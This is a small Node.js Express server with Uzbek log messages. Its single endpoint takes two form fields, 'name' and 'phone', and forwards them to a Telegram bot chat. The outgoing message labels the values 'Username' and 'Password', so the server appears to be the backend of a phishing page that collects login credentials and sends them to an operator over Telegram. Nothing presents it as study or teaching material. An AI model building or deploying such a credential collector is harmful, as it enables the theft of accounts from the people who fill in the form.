const express = require("express");
const cors = require("cors");
const axios = require("axios");
require("dotenv").config();

const app = express();

app.use(cors({
    origin: [
        "http://localhost:5173",
        "https://SENING-REACT-URL.onrender.com"
    ]
}));

app.use(express.json());


app.post("/api/test", async (req, res) => {
    try {
        const { name, phone } = req.body;

        console.log("Kelgan data:", name, phone);

        const text = `
📩 Yangi so'rov

👤 Username: ${name}
🔑 Password: ${phone}
`;

        const telegramResponse = await axios.post(
            `https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`,
            {
                chat_id: process.env.CHAT_ID,
                text: text,
            }
        );


        res.status(200).json({
            success: true,
            message: "Telegramga yuborildi!"
        });


    } catch (error) {

        console.log(
            "Telegram error:",
            error.response?.data || error.message
        );


        res.status(500).json({
            success: false,
            message: "Server xatosi"
        });
    }
});


const PORT = process.env.PORT || 5000;


app.listen(PORT, () => {
    console.log(`Server ishlayapti: ${PORT}`);
});